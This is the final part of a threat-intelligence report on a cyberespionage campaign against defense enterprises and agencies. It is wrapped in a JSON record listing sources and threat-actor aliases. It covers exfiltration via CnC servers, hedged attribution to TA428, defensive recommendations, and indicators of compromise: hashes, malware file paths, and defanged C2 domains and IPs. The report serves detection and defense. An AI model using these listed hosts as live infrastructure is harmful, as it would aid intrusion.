were sent to one of the stage one malware CnC servers,\nwhich are located in different countries of the world. In most cases, stage one\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 22\n\n\n-----\n\nTransfer\nof stolen data\nfrom infected\nsystems\n\n\n## Victims\n\n\nservers perform only one function – redirecting the data received to a stage\ntwo server that is located in China. It is worth noting that the registration data of\nthe stage one servers that we have seen includes the administrator’s email\naddress registered on a Chinese resource, 163.com.\n\nThe function of saving all data redirected to the stage two server was enabled\non one of the stage one servers.\n\nApparently, the attackers selected files manually, as the stolen data included\nfiles of different types from different directories. Only the files that had been\nselected were uploaded to the stage one server.\n\nWe currently know of more than a dozen victims of the attack and the\ninvestigation results indicate that this was a targeted and, one might even say,\npinpoint attack. All the victims identified are associated with the defense\nindustry or are public institutions.\n\nThe attack targeted industrial plants, design bureaus and research institutes,\ngovernment agencies, ministries and departments in several East European\ncountries (Belarus, Russia, and Ukraine), as well as Afghanistan.\n\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 23\n\n\n-----\n\nCountries\nin which attack\nvictims\nare located\n\n\n## About the attackers\n\nA Chinese-speaking group is highly likely to be behind the attacks.\n\n1. We can see significant overlaps in tactics, techniques, and procedures\n\n(TTPs) with TA428 activity.\n\n2. The attack analyzed used the same weaponizer, which embeds code of a\n\nCVE-2017-11882 exploit in documents, as in earlier TA428 attacks that\ntargeted enterprises in Russia’s military-industrial complex.\n\n3. Some indirect evidence also suggests a Chinese-speaking group very\n\nlikely being behind the attack. This includes:\n\na. the use of hacking utilities that are popular in China, such as Ladon,\n\nb. the fact that the second stage CnC server is located in China,\n\nc. the fact that the CnC server registration information includes an email\n\naddress in the Chinese domain 163.com specified in the\nadministrator’s contact data.\n\nIn the course of our research, we analyzed 59 sessions in which the attackers\nconnected to infected systems (importantly, these were cases where the\nattackers connected to infected systems and entered commands by hand\nrather than those associated with the malware running automatically). It turns\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 24\n\n\n-----\n\nTimes of\nattacker\nsessions on\ninfected\nsystems\n\n\nout that the time of day when these sessions took place falls within the 8 am to\n5 pm interval (with the exception of one case) in the GMT+8 time zone, where\nChina (as well as some other countries) is located.\n\nTimes of attacker sessions on infected systems\n\nWe believe that the attack series we have identified is an extension of known\n[campaign described in the research of Cybereason, DrWeb, and NTTSecurity.](https://www.cybereason.com/blog/portdoor-new-chinese-apt-backdoor-attack-targets-russian-defense-sector)\nThis is supported by numerous facts and a large amount of evidence we have\nidentified, from the choice of victims to matching CnC servers.\n\nThe authors of the research mentioned above attribute the attacks they\ndescribe to the activity of Chinese-speaking APT groups, pointing to TA428 as\none of the most likely perpetrators.\n\nAn analysis of information obtained in the investigation suggests that\ncyberespionage was the purpose of the attack series in question.\n\n\n## Conclusions\n\nThe results of our research demonstrate that spear phishing remains one of the\nmost relevant threats to industrial enterprises and public institutions. The\nattackers used primarily known backdoor malware, as well as standard\ntechniques for lateral movement and antivirus solution evasion. At the same\ntime, they were able to penetrate dozens of enterprises and even take control\nof the entire IT infrastructure, and IT security solutions of some of the\norganizations attacked.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 25\n\n\n-----\n\nThe attack series that we have discovered is not the first in the campaign and,\ngiven that the attackers achieve a certain degree of success, we believe it is\nhighly likely that they will continue to conduct similar attacks in the future.\nIndustrial enterprises and public institutions should take extensive measures to\nrepel such attacks successfully.\n\nWe are not wrapping up our investigation as yet and will release information on\nnew findings as they appear.\n\nIf you have any questions or comments after reading this report or if you have\nany additional information that is relevant to the malicious campaign described in\nit, please do not hesitate to get in touch with us by sending an email\n[to ics-cert@kaspersky.com.](mailto:ics-cert@kaspersky.com)\n\n## Recommendations\n\n1. Ensure that security software with support for centralized security policy\n\nmanagement is installed on all servers and workstations and keep the\nantivirus databases and program modules of your security solutions upto-date.\n\n2. Check that all security software components are enabled on all systems\n\nand that a policy is in place which requires the administrator password to\nbe entered in the event of attempts to disable protection.\n\n3. Check that Active Directory policies include restrictions on user attempts\n\nto log in to systems. Users should be only allowed to log in to those\nsystems which they need to access in order to perform their job\nresponsibilities.\n\n4. Restrict network connections, including VPN, to the systems on the OT\n\nnetwork; block connections on all those ports the use of which is not\nrequired by the industrial process.\n\n5. To the extent possible, limit trust relationships between the organization’s\n\ndomains and minimize the number of users with domain administrator\nprivileges.\n\n6. Train employees of the enterprise to securely work with the internet\n\nresources, and corporate communication channel such as email.\nSpecifically, explain the possible consequences of downloading and\nexecuting files from unverified sources. Focus on identifying phishing\nemails and on secure practices related to working with Microsoft Office\ndocuments.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 26\n\n\n-----\n\n7. Use accounts with local administrator and domain administrator privileges\n\nonly when this is necessary in order to perform the job responsibilities.\n\n8. Restrict the ability of programs to gain SeDebugPrivilege privileges\n\n(where possible).\n\n9. Enforce a password policy that has password complexity requirements\n\nand requires passwords to be changed on a regular basis.\n\n10. Consider using Managed Detection and Response class services to gain\n\nquick access to high-level knowledge and expertise of security\nprofessionals.\n\n11. Use dedicated ICS security solutions. Kaspersky Industrial CyberSecurity\n\nefficiently protects industrial endpoints and enables network monitoring\non the OT network to identify and block malicious activity.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 27\n\n\n-----\n\n## Appendix I – indicators of compromise\n\n**Note: Indicators provided in this section were up-to-date**\nand valid at the time of publication.\n```\n         File MD5\n         0A2E7C01B847D3B1C6EEBE6AF63DC140\n         0A945587E0E11A89D72B4C0B45A4F77E\n         10818F47AA4DC2B39A7B5EEF652F3C68\n         1157132504BE3BF556A80DB8A2FF9395\n         11955356232DCF6834515BF111BB5138\n         11BA5665EC1DBA660401AFDE64C2B125\n         17FA7898D040FA647AFA4467921A66CF\n         180EE3E469BFCFC079E1A46D16440467\n         1EA58FF469F5EE0FDCF5B30FC19E4CB8\n         216D9F82BA2B9289E68F9778E1E40AC9\n         29B62694DC9F720BD09438F37B7B358A\n         3953EB8F7825E756515BE79EF45655B0\n         3A13B99B2567190AB87E8AB745761017\n         40EB08F151859C1FE4DC8E6BC466B06F\n         413FA4AD3AFE00B34102C520A91F031C\n         4866622D249F3EA114495A4A249F3064\n         4AD1AD14044BD2C5A5C5E7E7DD954B23\n         4D42C314FF4341F2D1315D7810BD4E15\n         51367DC409A7A7E5521C2F700C56A452\n         51BEFD74AC3B8943DA58C841017A57A8\n         56AF3279253E4A60BD080DD6A5CA7BA8\n         5EA338D71D2A49E7B3259BC52F424303\n         5EB42E1BA99FACE02CE50EA1AAF72AB5\n         6038583B155F73FAF1B5EF8135154278\n         64EF950D1F31A41FE60C0FD10CA46109\n         6652923CE80A073FD985E20B8580E703\n         6BDF1C294B6A34A5769E872D49AFD9E7\n         6DFC3BDD2B70670BF29506E5828F627E\n         70DA6872B6B2DA9DDC94D14B02302917\n         7101FE9E82E9B0E727B64608C9FD5DF1\n         7C383C9CA29F78FCC815EAEA9373B4BB\n         7FE40325F0CEF8A32E69A6087EBC7157\n         84DF335EBC10633DA1524C7DBB836994\n         87AA0BEDF293E9B16A93E4411353F367\n         94AF1B400FDBDEBD8EDA337474C07479\n         AA7231904A125273F5E5EE55A1441BA4\n         AB26F4C877A7357CABF95FB5033A5BEF\n         AB55A08ED77736CE6D26874187169BC9\n         AE11F7218E919DF5B8A9A2C0DC247F56\n         B2C9F5CAE72AF5A50940D55BB5B92E98\n         C6D6CFFD56638A68A0DE11035B9C9097\n         CBECDFA1D0708D60500864A2A9DE4992\n         CCC9482A7BEE777BBB08172DCCDAB8AA\n         D394F005416A20505C597ECF7882450F\n         D44A276529343F7AC291AD7AD0B99378\n         D669B03807102B4AF87B20EC3731909A\n         DA765E4E6B0D2544FE3F71E384812C40\n\n```\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 28\n\n\n-----\n\n```\n         E005F5DA3BA5D6726DA4E6671605B814\n         E2A3CD2B3C2E43CA08D2B9EE78D4919B\n         E8800D59C411A948EE966FF745FBD5C9\n         E8A16193BCD477D8231E6FC1A484DC8A\n         EBCFFECE1B1AF517743D3DFFDE72CB43\n         F01A9A2D1E31332ED36C1A4D2839F412\n         FB2B4C9CA6A7871A98C6E2405E27A21F\n         FF6D8578BE65A31F3624B62E07BEF795\n         6860189B79FF35199F99171548F5CD65\n         9EC56A18333D4D4E4D3C361D487C05BD\n         E5B6571E1512D3896F8C2367DDC5A02D\n         7CB0D8CFFE48DF7B531B6BEDE8137199\n         86BB8FA0D00FD94F15AE1BD001037C6C\n         9F5BBA1ACEF3CCBBDC789F8813B99067\n         4EA2B943A1D9539E42C5BDBA3D3CA7A0\n         5934B7E24D03E92B3DBACBE49F6E677C\n         C8F13C9890CEB695538FDC44AD817278\n         BABDF6FA73E48345F00462C3EF556B86\n         CBB7E0B8DDE2241480B71B9C648C1501\n         File path\n         C:\\1\\mcinsupd.cfg\n         C:\\1\\mcinsupd.exe\n         C:\\1\\mytilus3.dll\n         C:\\1C\\ace.exe\n         C:\\2\\LiveUpdate.exe\n         C:\\2\\safestore64.dll\n         C:\\3\\mcinsupd.cfg\n         C:\\3\\mcinsupd.exe\n         C:\\3\\mytilus3.dll\n         C:\\4\\LiveUpdate.exe\n         C:\\4\\safestore64.dll\n         C:\\Microsoft\\MF\\Instsrv.exe\n         C:\\Microsoft\\MF\\wus.dll\n         C:\\ProgramData\\1C\\ace.exe\n         C:\\ProgramData\\2GIS\\!research\\Remediation.exe\\winhelp.tmp\n         C:\\ProgramData\\2GIS\\conhost.exe\n         C:\\ProgramData\\2GIS\\conhost.exe.cab\n         C:\\ProgramData\\2GIS\\ps.cab\n         C:\\ProgramData\\2GIS\\Remediation.exe\n         C:\\ProgramData\\2GIS\\Remediation.exe.cab\n         C:\\ProgramData\\2GIS\\research\\conhost.exe\n         C:\\ProgramData\\2GIS\\research\\Ps.exe\n         C:\\ProgramData\\2GIS\\research\\Remediation.exe\n         C:\\ProgramData\\AADConnect\\1.bat\n         C:\\ProgramData\\AADConnect\\bdtkexec.cfg\n         C:\\ProgramData\\AADConnect\\PtWatchDog.exe\n         C:\\ProgramData\\AADConnect\\TmDbgLog.dll\n         C:\\ProgramData\\Adobe\\ARM\\mcsync.exe\n         C:\\ProgramData\\Adobe\\ARM\\mcsync.log\n         C:\\ProgramData\\Adobe\\ARM\\McUtil.dll\n         C:\\ProgramData\\Apple\\asOELnch.exe\n         C:\\ProgramData\\Apple\\ccLib.dll\n         C:\\ProgramData\\Apple\\NordLnch.cfg\n         C:\\ProgramData\\ASUS\\ALL\\mcsync.exe\n\n```\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 29\n\n\n-----\n\n```\n         C:\\ProgramData\\ASUS\\ALL\\mcsync.log\n         C:\\ProgramData\\ASUS\\ALL\\McUtil.dll\n         C:\\ProgramData\\Intel\\hccutils.dll\n         C:\\ProgramData\\Intel\\hkcmd.exe\n         C:\\ProgramData\\Intel\\hkSetting.cfg\n         C:\\ProgramData\\Microsoft\\AppV\\hccutils.dll\n         C:\\ProgramData\\Microsoft\\AppV\\hkcmd.exe\n         C:\\ProgramData\\Microsoft\\AppV\\hkSetting.cfg\n         C:\\ProgramData\\Microsoft\\Crypto\\RSA\\asOELnch.exe\n         C:\\ProgramData\\Microsoft\\Crypto\\RSA\\ccLib.dll\n         C:\\ProgramData\\Microsoft\\Crypto\\RSA\\mcsync.exe\n         C:\\ProgramData\\Microsoft\\Crypto\\RSA\\mcsync.log\n         C:\\ProgramData\\Microsoft\\Crypto\\RSA\\McUtil.dll\n         C:\\ProgramData\\Microsoft\\Crypto\\RSA\\NordLnch.cfg\n         C:\\ProgramData\\Microsoft\\DRM\\LiveUpdate.exe\n         C:\\ProgramData\\Microsoft\\DRM\\mcinsupd.cfg\n         C:\\ProgramData\\Microsoft\\DRM\\mcinsupd.exe\n         C:\\ProgramData\\Microsoft\\DRM\\mytilus3.dll\n         C:\\ProgramData\\Microsoft\\DRM\\safestore64.dll\n         C:\\ProgramData\\Microsoft\\MF\\Active.GRL\n         C:\\ProgramData\\Microsoft\\MF\\Instsrv.exe\n         C:\\ProgramData\\Microsoft\\MF\\Pending.GRL\n         C:\\ProgramData\\Microsoft\\MF\\wus.dll\n         C:\\ProgramData\\Microsoft\\uconhost.exe\n         C:\\ProgramData\\Oracle\\ace.exe\n         C:\\ProgramData\\sh.exe\n         C:\\Users\\Default\\AppData\\Roaming\\winset\\LiveUpdate.exe\n         C:\\Users\\Default\\AppData\\Roaming\\winset\\safestore64.dll\n         C:\\Windows\\System32\\Tasks\\GUP\n         C:\\Windows\\System32\\Tasks\\hkcmd\n         C:\\Windows\\System32\\wam.dll\n         C:\\Windows\\System32\\wus.dll\n         C:\\Windows\\SysWOW64\\wus.dll\n         C:\\Windows\\Temp\\conhost.dll\n         C:\\Windows\\Temp\\conhost.exe\n         C:\\Windows\\Temp\\mcoemcpy.exe\n         C:\\Windows\\Temp\\McoemcpyRun.log\n         C:\\Windows\\Temp\\McUtil.dll\n         C:\\Windows\\Temp\\McUtil.dll.cab\n         C:\\Windows\\Temp\\net.log\n         C:\\Windows\\Temp\\smcw.dll\n         C:\\Windows\\Web\\1.bat\n         C:\\Windows\\Web\\1\\hccutils.dll\n         C:\\Windows\\Web\\1\\hkcmd.exe\n         C:\\Windows\\Web\\1\\hkSetting.cfg\n         C:\\Windows\\Web\\ace.exe\n         C:\\Windows\\Web\\Ladon.exe\n         C:\\Windows\\Web\\wmic.vbs\n         C:\\ProgramData\\Microsoft\\Network\\Downloader\\Client.cfg\n         C:\\ProgramData\\Microsoft\\Network\\Downloader\\Update.exe\n         C:\\ProgramData\\mc.cab\n         C:\\ProgramData\\my_capture.exe\n         %AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MpClient.dll\n         %AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MsMpEng.exe\n         %AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MSCAL.OCX\n         %AppData%\\Roaming\\Microsoft\\MsMpEng.exe\n\n```\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 30\n\n\n-----\n\n```\n         C:\\ProgramData\\temp\\wcrypt32.dll\n         C:\\ProgramData\\temp\\wmic.dll\n         C:\\ProgramData\\ABBYY\\FineReader\\Client.cfg\n         C:\\ProgramData\\ABBYY\\FineReader\\debug.log\n         C:\\ProgramData\\ABBYY\\FineReader\\OEMPRINT.CAT\n         C:\\ProgramData\\ABBYY\\FineReader\\Update.exe\n         C:\\ProgramData\\ABBYY\\FineReader\\WINWORD.EXE_\n         C:\\Windows\\Temp\\Client.cfg\n         C:\\ProgramData\\Adobe\\Setup\\mcinsupd.exe\n         C:\\ProgramData\\Adobe\\Setup\\mcinsupd.cfg\n         Security solution verdicts\n         Backdoor.Win32.Agent.myuhpj\n         Backdoor.Win32.Agentb.ca\n         Backdoor.Win32.Agentb.cc\n         Backdoor.Win32.CotSam.a\n         Backdoor.Win64.Agent.iwv\n         Backdoor.Win64.Agent.iwy\n         Backdoor.Win64.Agent.iwz\n         Backdoor.Win64.Agent.ixl\n         Backdoor.Win64.Agent.ixm\n         HackTool.Win64.Agent.hk\n         HEUR:Trojan.Win32.APosT.gen\n         not-a-virus:NetTool.Win32.NbtScan.a\n         Trojan.Win32.Agentb.kpkq\n         Trojan.Win32.APosT.mim\n         Trojan.Win32.APosT.min\n         Trojan.Win32.APosT.mxw\n         Trojan.Win64.Agent.qwhymc\n         Trojan.Win64.Agent.qwhypj\n         Trojan.Win64.Agentb.bdq\n         Trojan.Win64.Agentb.bse\n         Trojan.Win64.Agentb.bsf\n         Trojan.Win64.Dllhijacker.km\n         Trojan.Win64.Dllhijacker.ks\n         Trojan.Win64.DllHijacker.qq\n         HEUR:Backdoor.Win32.CotSam.gen\n         Backdoor.Win64.CotSam.a\n         Domain names and IP addresses\n         www1.nppnavigator[.]net\n         www3.vpkimplus[.]com\n         45.151.180[.]178\n         custom.songuulcomiss[.]com\n         tech.songuulcomiss[.]com\n         video.nicblainfo[.]net\n         160.202.162[.]122\n         doc.redstrpela[.]net\n         fax.internnetionfax[.]com\n         www2.defensysminck[.]net\n         info.ntcprotek[.]com\n         www1.dotomater[.]club\n         192.248.182[.]121\n\n```\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 31\n\n\n-----\n\n```\n         www2.sdelanasnou[.]com\n         54.36.189[.]105\n         5.180.174[.]10\n         45.63.27[.]162\n         server.dotomater[.]club\n\n```\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 32\n\n\n-----\n\nKaspersky Industrial Control Systems Cyber Emergency Response Team (Kaspersky ICS CERT)\nis a global project of Kaspersky aimed at coordinating the efforts of automation system vendors,\nindustrial facility owners and operators, and IT security researchers to protect industrial enterprises\nfrom cyberattacks. Kaspersky ICS CERT devotes its efforts primarily to identifying potential and\nexisting threats that target industrial automation systems and the industrial internet of things.\n\nKaspersky ICS CERT [ics-cert@kaspersky.com](mailto:ics-cert@kaspersky.com)\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 33\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://ics-cert.kaspersky.com/media/Kaspersky-ICS-CERT-Targeted-attack-on-industrial-enterprises-and-public-institutions-En.pdf"
    ],
    "report_names": [
        "Kaspersky-ICS-CERT-Targeted-attack-on-industrial-enterprises-and-public-institutions-En.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a4aca3ca-9e04-42d1-b037-f7fb3fbab0b1",
            "created_at": "2023-01-06T13:46:39.042499Z",
            "updated_at": "2025-03-27T02:00:02.984002Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Colourful Panda",
                "BRONZE DUDLEY"
            ],
            "source_name": "MISPGALAXY:TA428",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c416260c-7ff6-4a74-a5ba-a15f40d3543f",
            "created_at": "2024-05-01T02:03:07.939268Z",
            "updated_at": "2025-03-27T02:05:17.25652Z",
            "deleted_at": null,
            "main_name": "BRONZE DUDLEY",
            "aliases": [
                "Temp.Hex ",
                "Vicious Panda ",
                "TA428 "
            ],
            "source_name": "Secureworks:BRONZE DUDLEY",
            "tools": [
                "PoisonIvy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041605,
    "ts_creation_date": 1659715674,
    "ts_modification_date": 1659715674,
    "files": {
        "pdf": "https://archive.orkl.eu/2459c48c35a96c3e40cbc5c6a98e1db9eb41e562.pdf",
        "text": "https://archive.orkl.eu/2459c48c35a96c3e40cbc5c6a98e1db9eb41e562.txt",
        "img": "https://archive.orkl.eu/2459c48c35a96c3e40cbc5c6a98e1db9eb41e562.jpg"
    }
}